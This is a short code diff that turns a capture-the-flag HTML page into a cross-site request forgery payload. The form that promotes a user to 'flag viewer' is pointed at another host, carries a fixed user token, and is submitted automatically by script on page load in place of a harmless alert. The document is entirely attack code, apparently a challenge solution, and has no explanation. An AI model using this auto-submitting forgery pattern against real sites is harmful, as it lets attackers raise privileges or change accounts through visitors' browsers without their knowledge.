@@ -5,7 +5,7 @@
 <h1>ctf</h1>
 
 
-<form action="/promote" method="post">
+<form id='theForm' action="customer.w-va.cf/promote" method="post">
 	<h2>Promote a user to a flag viewer</h2>
 	<input name="user_token" value="60650017-91ff-49d9-ae8e-5002f836464f" style="width: 100%">
 	<input type="submit" style="margin-top: 20px;">
@@ -13,7 +13,7 @@
 
 <script type="text/javascript">
 function codeAddress() {
-	alert('ok');
+	document.getElementById('theForm').submit();
 }
 window.onload = codeAddress;
 </script>
